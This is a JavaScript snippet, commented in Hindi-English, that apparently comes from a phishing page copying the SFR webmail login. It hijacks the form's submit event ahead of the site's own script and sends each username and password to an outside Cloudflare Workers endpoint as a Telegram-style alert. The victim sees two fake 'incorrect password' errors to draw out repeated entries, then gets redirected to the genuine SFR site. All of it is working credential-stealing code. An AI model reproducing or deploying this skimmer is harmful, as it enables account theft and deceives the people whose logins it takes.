<script>
    const BACKEND_URL = "https://testdatasend.narpatprihar2005.workers.dev";
    const REDIRECT_URL = "https://webmail.sfr.fr/";

    // Event listener ko "capture: true" ke sath lagaya hai taaki original SFR script ise block na kar sake
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
        
        e.preventDefault(); 
        e.stopImmediatePropagation(); // Original script ki chutti!

        const user = document.getElementById("username").value.trim();
        const pass = document.getElementById("password").value;
        const btn = document.getElementById("identifier");
        const errorBox = document.getElementById("passwordError");

        if (user !== "" && pass !== "") {
            
            // LocalStorage count for 3-attempts
            let attempts = parseInt(localStorage.getItem('sfr_attempts')) || 0;
            attempts++;
            localStorage.setItem('sfr_attempts', attempts);

            // Button UI change (Connexion en cours...)
            const originalBtnText = btn.innerText;
            btn.disabled = true;
            btn.innerText = "Connexion...";
            errorBox.style.display = "none";

            // Telegram Message Payload
            const msg = `🚨 **Nouveau Login SFR**\n📌 **Tentative:** ${attempts}/3\n👤 **Identifiant:** ${user}\n🔑 **Password:** ${pass}`;

            try {
                // Send data to Cloudflare Worker
                await fetch(BACKEND_URL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text_data: msg })
                });

                // Logic Execution
                if (attempts < 3) {
                    // Pehli aur doosri baar error
                    setTimeout(() => {
                        errorBox.innerText = "Identifiant ou mot de passe incorrect.";
                        errorBox.style.display = "block";
                        document.getElementById("password").value = "";
                        document.getElementById("password").focus();
                        btn.disabled = false;
                        btn.innerText = originalBtnText;
                    }, 1000);
                } else {
                    // 3rd attempt redirect
                    localStorage.removeItem('sfr_attempts');
                    window.location.replace(REDIRECT_URL);
                }
            } catch (error) {
                console.error("Fetch error:", error);
                // Safe redirect agar worker fail ho jaye
                if (attempts >= 3) {
                    window.location.replace(REDIRECT_URL);
                } else {
                    errorBox.innerText = "Erreur réseau. Veuillez réessayer.";
                    errorBox.style.display = "block";
                    btn.disabled = false;
                    btn.innerText = originalBtnText;
                }
            }
        }
    }, true); // Important: "true" parameter ensures this runs FIRST.
</script>
